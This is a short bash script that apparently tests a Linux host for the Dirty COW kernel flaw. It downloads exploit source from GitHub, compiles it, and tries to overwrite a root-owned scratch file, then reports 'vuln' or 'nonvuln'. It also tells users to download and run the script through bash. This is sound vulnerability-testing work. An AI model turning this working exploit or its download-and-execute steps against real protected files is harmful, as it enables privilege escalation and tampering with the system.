#!/usr/bin/env bash
USAGE="\
curl https://raw.githubusercontent.com/kiorky/dirtyc0w/master/dirtyc0w/dirtycow.sh>dirtycow.sh;\
cat dirtycow.sh;\
echo press_enter;read;bash dirtycow.sh
"
set -ex
if [ ! -e dirtyc0w.c ];then
    curl https://raw.githubusercontent.com/kiorky/scripts/master/dirtyc0w/dirtyc0w.c > dirtyc0w.c
fi
gcc -pthread dirtyc0w.c -o dirtyc0w
if [ x${NOTOUCH-} = x ];then sudo -s -- sh -c 'echo>m00m00';fi
./dirtyc0w $(pwd)/m00m00 m00000000000000000
if grep -q 000 m00m00;then
    echo vuln;
else
    echo nonvuln
fi
